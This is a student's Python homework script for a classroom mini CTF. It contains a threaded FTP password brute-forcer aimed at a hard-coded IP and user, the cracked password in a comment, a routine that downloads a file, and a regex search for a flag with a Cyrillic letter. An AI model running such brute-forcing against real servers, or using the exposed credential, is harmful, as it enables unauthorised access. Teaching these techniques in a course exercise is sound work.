# ДЗ №10 Светлаков Е.С.
# Мини ЦТФ для желающих:
# 1. сбрутить ФТП пароль для юзера test_user на сервере 45.143.93.4
# 2. выкачать лежащий там файлик с флагом
# 3. найти флаг по подсказке: в флаге присутствует кириллица
# 4. флаг принесете на занятие:)
# ЗЫ: просьба файл с флагом не удалять и вобще не шалить,
# там пока права не настроены:)
# ЗЗЫ: брутфорсер запускайте с time... , чтобы сравнить эффективность
# для ориентира мой коленочный брутфорсер нашел верный пароль за 28 сек,
# если идти от начала файла.

import concurrent.futures
import contextlib
import os
import re
from ftplib import FTP, all_errors

# https://www.thepythoncode.com/article/brute-force-attack-ftp-servers-using-ftplib-in-python


def try_ftp(psw: str):
    host = "45.143.93.4"
    user = "test_user"
    try:
        with FTP(host=host, user=user, passwd=psw, timeout=5) as ftp:
            return psw
    except all_errors:
        return None


def work_ftp(host, user, password):
    try:
        with FTP(host=host, user=user, passwd=password, timeout=5) as ftp:
            print(ftp.getwelcome())
            # list_dir = ftp.retrlines('LIST')
            # print(list_dir)
            with open('xdz.crash.log', 'wb') as file:
                get_file = ftp.retrbinary(
                    'RETR' + ' ' + 'xdz.crash', file.write)
                print(get_file)
    except all_errors as e:
        pass


os.chdir('./Lesson10')

# bruting ftp password
# psw= hacker9900
# with open('psw.txt') as file:
#     pswds = file.read().split("\n")
# password_for_ftp = ""
# with concurrent.futures.ThreadPoolExecutor() as executor:
#     futures = []
#     for p in pswds:
#         futures.append(executor.submit(try_ftp, p))
#     for future in concurrent.futures.as_completed(futures):
#         if future.result() is not None:
#             password_for_ftp = future.result()
#             print(f"Password for ftp: {password_for_ftp}")
#             executor.shutdown(wait=False)

# get file from ftp
# work_ftp("45.143.93.4", "test_user", "hacker9900")

# Search flag in file
regexp_str = r'fl[А-Яа-я]g=[0-9]{1,}'
flag = ''
with open('./xdz.crash.log', 'r') as file:
    for i, line in enumerate(file):
        search_result = re.search(regexp_str, line)
        if search_result is not None:
            flag = search_result.group(0)
    print(flag)
# flаg=314159
